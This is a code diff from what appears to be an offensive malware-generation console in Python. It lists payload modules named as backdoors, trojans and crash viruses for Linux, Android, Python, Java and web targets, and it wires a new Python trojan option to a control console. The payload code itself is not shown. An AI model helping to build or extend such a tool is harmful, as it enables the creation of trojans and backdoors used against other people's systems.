@@ -6,6 +6,7 @@ import os
 import WebControl as webControl
 import ConfigConsole as ConfigConsole
 import ProxyService as ProxyService
+import PyControlConsole as PyControlConsole
 
 
 def get_file_content(path: str, exception: bool) -> str:
@@ -24,6 +25,7 @@ def get_file_content(path: str, exception: bool) -> str:
 
     finally:
         pass
+
 
 def copy_file(source: str,target: str):
     o = open(source)
@@ -44,7 +46,7 @@ payload: list[str] = [
     'linux/amd64/crash_virus',
     'linux/platform/backdoor',
     'android/arch64/trojan_virus',
-    'program/python/backdoor',
+    'program/python/trojan_virus',
     'program/java/trojan_virus',
     'web/attack/trojan_virus ',
     'web/attack/crash_virus',
@@ -75,6 +77,9 @@ def run_command(command: str) -> bool:
             if use_payload == 'linux/amd64/crash_virus':
                 print("The file has been generated in "+os.environ['HOME']+"/LinuxCrashVirus.sh")
                 copy_file(runPath+"/../Module/linux/amd64/crash_virus/LinuxCrashVirus.sh",os.environ['HOME']+"/LinuxCrashVirus.sh")
+
+            if use_payload == 'program/python/trojan_virus':
+                PyControlConsole.console(runPath)
 
             if use_payload == 'post/proxy/server':
                 print(" [INFO] Proxy Server Module.")
